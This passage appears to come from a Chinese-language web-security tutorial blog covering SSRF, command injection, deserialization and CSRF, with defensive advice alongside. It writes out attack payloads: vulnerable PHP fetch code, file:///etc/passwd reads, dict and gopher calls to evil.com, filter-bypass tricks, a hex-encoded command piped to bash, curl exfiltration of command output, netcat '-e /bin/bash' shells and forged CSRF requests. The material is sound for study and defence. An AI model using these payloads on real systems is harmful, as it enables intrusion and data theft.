<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">content = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename =<span class="string">&#x27;/img/oldboy/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>;</span> </span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$content</span>);</span> </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">img = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span> </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h3 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a><strong>sockopen()</strong></h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">fp = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span> </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">fp, <span class="variable">$out</span>);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents=<span class="string">&#x27;&#x27;</span>;</span> </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents.= fgets(<span class="variable">$fp</span>, 1024);</span> </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">fp);</span> </span><br><span class="line">return $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">curlobj = curl_init();</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_POST, 0);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj,CURLOPT_URL,<span class="variable">$link</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">result=curl_exec(<span class="variable">$curlobj</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_close($</span><span class="language-bash">curlobj);</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$result</span>);</span> </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>注意事项</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(\%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="URL伪协议"><a href="#URL伪协议" class="headerlink" title="URL伪协议"></a>URL伪协议</h2><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>
<p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
<p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p>
<p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p>
<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表</p>
<p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p>
<h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a><strong>gopher</strong></h3><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
<p>SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样变可以解决漏洞点不在GET参数的问题了。 </p>
<p>基本协议格式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt; </span><br></pre></td></tr></table></figure>



<blockquote>
<p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-&lt;?php header(‘Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest’);?&gt;<br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><strong>1、限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
<blockquote>
<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
</blockquote>
<p><strong>2、采用短地址绕过</strong></p>
<blockquote>
<p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p>
</blockquote>
<p><strong>3.采用进制转换</strong></p>
<blockquote>
<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
</blockquote>
<p><strong>4.利用特殊域名</strong></p>
<blockquote>
<p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
</blockquote>
<p><strong>5.利用[::]</strong></p>
<blockquote>
<p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p>
</blockquote>
<p><strong>6.利用句号</strong></p>
<blockquote>
<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
</blockquote>
<p><strong>7、CRLF 编码绕过</strong></p>
<blockquote>
<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
<p>1 example.com&#x2F;?url&#x3D;<a href="http://eval.com/%0d/%0aHOST:fuzz.com/%0d/%0a">http://eval.com\%0d\%0aHOST:fuzz.com\%0d\%0a</a> </p>
</blockquote>
<p><strong>8.利用封闭的字母数字</strong></p>
<blockquote>
<p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
</blockquote>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1）过滤192.168.0.0&#x2F;10.0.0.0&#x2F;172.16.0.0  localhost 私有地址、ipv6地址</p>
<p>2）过滤file:&#x2F;&#x2F;&#x2F;    、 dict:&#x2F;&#x2F;   、gopher:&#x2F;&#x2F;   、ftp:&#x2F;&#x2F;、 http:&#x2F;&#x2F;   https:&#x2F;&#x2F;    php:&#x2F;&#x2F;&#x2F;危险schema</p>
<p>3）白名单过滤</p>
<p>4）对返回的内容进行识别</p>
<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><a href="./doc/11%E3%80%81SSRF%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.docx">.&#x2F;doc&#x2F;11、SSRF攻击技术.docx</a></p>
<p><a href="./doc/SSRF%E6%94%BB%E5%87%BB.xmind">.&#x2F;doc&#x2F;SSRF攻击.xmind</a></p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。</p>
<p>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p>
<p><strong>漏洞原理</strong></p>
<p>​	应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞</p>
<p><strong>漏洞危害</strong></p>
<ul>
<li>继承Web服务器程序的权限，去执行系统命令或读写文件</li>
<li>反弹shell</li>
<li>控制整个网站，甚至控制整个服务器</li>
</ul>
<p><strong>漏洞产生的原因</strong></p>
<ol>
<li>没有对用户的输入进行过滤或者过滤不严格</li>
<li>系统漏洞造成的代码执行</li>
<li>调用第三方组件存在代码执行漏洞</li>
</ol>
<h2 id="可能存在漏洞的函数"><a href="#可能存在漏洞的函数" class="headerlink" title="可能存在漏洞的函数"></a>可能存在漏洞的函数</h2><h3 id="利用系统函数实现远程命令执行的函数"><a href="#利用系统函数实现远程命令执行的函数" class="headerlink" title="利用系统函数实现远程命令执行的函数"></a>利用系统函数实现远程命令执行的函数</h3><p>常见出现漏洞的地方：</p>
<p>​	只要带参数的地方都可能出现命令执行漏洞</p>
<p>​	常见的路由器、防火墙、入侵检测、自动化运维平台</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eval（）、assert（）、preg_replace（）、call_user_func（）</span><br></pre></td></tr></table></figure>



<p>如果页面存在以上的函数并且对用户的输入没有做严格的过滤，就存在RCE命令执行漏洞，还有其他的函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）</span><br></pre></td></tr></table></figure>

<h3 id="直接执行系统命令的函数"><a href="#直接执行系统命令的函数" class="headerlink" title="直接执行系统命令的函数"></a>直接执行系统命令的函数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</span><br></pre></td></tr></table></figure>





<h2 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h2><p>命令拼接符是进行命令链接的基础，会使用命令拼接符才是利用命令执行漏洞的基础</p>
<h3 id="Windows常用命令拼接符"><a href="#Windows常用命令拼接符" class="headerlink" title="Windows常用命令拼接符"></a>Windows常用命令拼接符</h3><p><img src="/img/oldboy/image-20250309180405696.png" alt="image-20250309180405696"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp;：拼接符两边只要有一个真就会执行</span><br><span class="line">&amp;&amp;：命令拼接符拼接多个命令时，会按照顺序执行，当遇到假的命令时会将终止执行。</span><br><span class="line">|：命令拼接符拼接多个命令时，只要有一个为假，其余都不执行；如果遇到为真则都执行，但是执行回显最后一个指令的运行结果。</span><br><span class="line">||：拼接多个指令时，按照顺序执行，执行完一个真的命令，则终止执行。</span><br></pre></td></tr></table></figure>





<h3 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h3><p>第一个是”&amp;”</p>
<p>​	‘&amp;’的作用是使命令在后台运行。只要在命令后面跟空格和&amp;，就可以在后台运行命令，终止方法是kill -s 进程号</p>
<p>第二个是”;”</p>
<p>​	就是<strong>分号</strong>，作用就是可以进行多条命令的无关联执行，每一条执行结果互不影响</p>
<p>第三个是”&amp;&amp;”</p>
<p>​	左边成功运行再执行右边</p>
<p>第四个是”||“</p>
<pre><code> 这个也跟windows一样，前面执行失败才执行后面
</code></pre>
<p>第五个是”()”</p>
<p>​	如果想执行几个命令，则需要用<strong>命令分隔符分号隔开每个命令</strong>，并使用圆括号()把所有命令组合起来</p>
<h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>如果命令注入的网站过滤了某些分隔符，可以将分隔符编码后（url编码，base等）绕过</p>
<h3 id="八进制绕过"><a href="#八进制绕过" class="headerlink" title="八进制绕过"></a>八进制绕过</h3><blockquote>
<p>&#x2F;&#x2F;ls命令，这个编码后可以拼接</p>
<p>$(printf  “\154\163”)</p>
</blockquote>
<h3 id="十六进制字符绕过"><a href="#十六进制字符绕过" class="headerlink" title="十六进制字符绕过"></a>十六进制字符绕过</h3><blockquote>
<p>echo “636174202F6574632F706173737764” | xxd -r -p|bash</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1d24adfefdb0aa6926476286b1348d15.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><blockquote>
<p>Linux内置分隔符：${IFS},$IFS,$IFS$9</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d7debf88466e4517cd3056268b6a1d73.png#pic_center" alt="在这里插入图片描述"></p>
<p>利用重定向符<code>&lt;&gt;</code></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/db099bc3bbe9484a136f3ed58cb8a732.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><ul>
<li><p>通过拆分命令达到绕过的效果：<code>a=1;b=s;\$a\$b</code></p>
</li>
<li><p>空变量绕过：<code>cat fl$&#123;x&#125;ag</code> <code>cat tes$(z)t/flag</code></p>
</li>
<li><p>控制环境变量绕过：</p>
<p>先利用echo $PATH得到环境变量 &#x3D;&gt; “&#x2F;usr&#x2F;local&#x2F;….blablabla”<br>接着利用echo${PATH}得到长度<br>然后要哪个字符截取哪个字符就行<br>${PATH:0:1} &#x3D;&gt; ‘&#x2F;’<br>${PATH:1:1} &#x3D;&gt; ‘u’<br>${PATH:0:4} &#x3D;&gt; ‘&#x2F;usr’</p>
</li>
<li><p>空值绕过：<code>cat fl&quot;&quot;ag</code> <code>cat fl&#39;&#39;ag</code> <code>cat &quot;fl&quot;&quot;ag&quot;</code></p>
</li>
<li><p>反斜杠绕过：<code>ca\t flag</code> <code>l\s</code></p>
</li>
</ul>
<p><img src="/img/oldboy/35de9c0767cf41e5b1efe363b2ff5d77.png" alt="在这里插入图片描述"></p>
<h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><blockquote>
<p>$*和$@，$x(x 代表 1-9)，${x}(x&gt;&#x3D;10)：比如<code>ca$&#123;21&#125;t a.txt</code>表示<code>cat a.txt</code><br>在没有传入参数的情况下，这些特殊字符默认为空，如下:</p>
<ul>
<li>wh$1oami</li>
<li>who$@ami</li>
<li>whoa$*mi</li>
</ul>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4d4de863ab4dd7a2ffd8f9f36ed16568.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="花括号的用法"><a href="#花括号的用法" class="headerlink" title="花括号的用法"></a>花括号的用法</h3><blockquote>
<p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令<code>&#123;cat,flag&#125;</code></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6d23bc87860d7467f7a4ae12ce50b24a.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><p>可以通过curl命令将命令的结果输出到访问的url中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl www.rayi.vip/`whoami`</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在服务器日志中可看到：<code>xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] &quot;GET /root HTTP/1.1&quot; 404 146 &quot;-&quot; &quot;curl/7.58.0&quot;</code>，这样，命令的回显就能在日志中看到了</p>
<h3 id="读文件命令"><a href="#读文件命令" class="headerlink" title="读文件命令"></a>读文件命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd</span><br></pre></td></tr></table></figure>

<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -L -p 9090-e cmd.exe (Windows)</span><br><span class="line"></span><br><span class="line">nc -l -p 9090-e /bin/bash (*nix)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、各种框架、插件等位置都有可能出现命令执行，升级到新版本，多打补丁</p>
<p>2、关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</p>
<p>3、少用框架&#x2F;CMS</p>
<p>4、可以过滤一些符号从而减少一些危险</p>
<p>5、安全配置好php相关参数      </p>
<p>​	通过Php配置文件里面有个disable_functions &#x3D; 配置，这个禁止某些php函数， 服务器便是用这个来禁止php的执行命令函数。</p>
<p>6、升级中间件</p>
<p>7、严格控制传入变量，严禁使用魔法函数</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h2><p>序列化：把对象转换成字节序列的过程，即把对象转换为可以存储或传输的数据过程。</p>
<p>反序列化：八字节序列恢复成对象的过程，即把可以存储或传输的数据转化为对象的过程。</p>
<p><strong>漏洞产生的原因</strong></p>
<p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的</p>
<p><strong>产生原理</strong></p>
<p>serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。 当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。	</p>
<h2 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h2><ol>
<li><strong>更新和修补：</strong> 更新应用程序和库到最新版本，修补已知的漏洞。</li>
<li><strong>代码审计：</strong> 对代码进行安全审计，查找和修复潜在的反序列化问题。</li>
<li><strong>使用安全配置：</strong> 使用安全配置选项来限制反序列化操作。</li>
</ol>
<h1 id="CSRF客户端伪造请求"><a href="#CSRF客户端伪造请求" class="headerlink" title="CSRF客户端伪造请求"></a>CSRF客户端伪造请求</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>CSRF：客户端请求伪造，是一种对恶意脚本的一种利用方式。</p>
<p><strong>简单来说：就是受害者在登录状态下，且服务端没有进行token和refer校验，攻击者利用CSRF漏洞构造恶意的连接诱导客户者点击，以受害者信息执行特定的操作。</strong></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="/img/oldboy/ef9eed0b772951bc593c5d9f7c348c84.jpeg" alt="在这里插入图片描述"></p>
<p><strong>攻击的本质</strong></p>
<ol>
<li>在CSRF攻击中，攻击者诱使用户的浏览器发起一个恶意请求，本质上是借助用户的凭证，以用户的身份去执行特定的操作。</li>
<li>在用户访问攻击者构造的恶意页面时，如果此时浏览器访问第三方站点带上了第三方的Cookie，那么第三方站点会认为这是一个已登录的用户的访问请求，浏览器就可顺利完成请求操作，因此该攻击方式叫做“跨站请求伪造”。</li>
<li>在整个攻击过程中，攻击者并没有拿到受害者的身份凭证，也拿不到操作后的返回结果(同源策略)，攻击者只是诱使受害者发出了一个特定的请求。</li>
</ol>
<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h3><p>GET类型的漏洞类似于XSS漏洞（只不过需要受害者在登陆状态）</p>
<p><strong>仅需要构造HTTP请求，诱导用户在登陆状态下点击，即可构造CSRF攻击</strong></p>
<p>简单示例：</p>
<p>银行站点A：它以GET请求来完毕银行转账的操作，如：</p>
<blockquote>
<p><a href="http://www.mybank.com/Transfer.php?toBankId=11&money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a> </p>
</blockquote>
<p>攻击者构造：</p>
<blockquote>
<p>&lt;img src&#x3D;<a href="http://www.mybank.com/Transfer.php?toBankId=113&money=1000%3E">http://www.mybank.com/Transfer.php?toBankId=113&amp;money=1000&gt;</a></p>
</blockquote>
<p>首先。你登录了银行站点A，然后访问危险站点B，这时你会发现你的银行账户少了1000块。</p>
<h3 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h3><p>这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是&lt;image&gt;、&lt;iframe&gt;、&lt;script&gt;等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p>
<p>而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是$_REQUEST，而非$_POST获取变量，则会存在这个问题。</p>
<p>例如：</p>
<blockquote>
<form action=" / register" id="register" method="post" >
<input type=text name="username" value="" />
<input type=password name="password" value="" />
<input type=submit name="submit" value="submit" />
</form>
</blockquote>
<p>攻击者可以尝试构造一个GET请求</p>
<blockquote>
<p>http: &#x2F;&#x2F;host&#x2F;register?username&#x3D;test&amp;password&#x3D;passwd</p>
</blockquote>
<p>若无法构造成功，可以通过Burp构造post类型的CSRF攻击：</p>
<blockquote>
<form action="http: / / www . a.com/register" id="register" method="post" ><input type=text name="username" value=""/>
<input type=password name="password" value=""/><input type=submit name="submit" value="submit"/></ form>
<script>
var f = document.getElementById ( "register");
f.inputs [0].value = "test";
f.inputs [1].value = "passwd" ;
f.submit ();
</script>
</blockquote>
<h2 id="漏洞挖掘-2"><a href="#漏洞挖掘-2" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。</p>
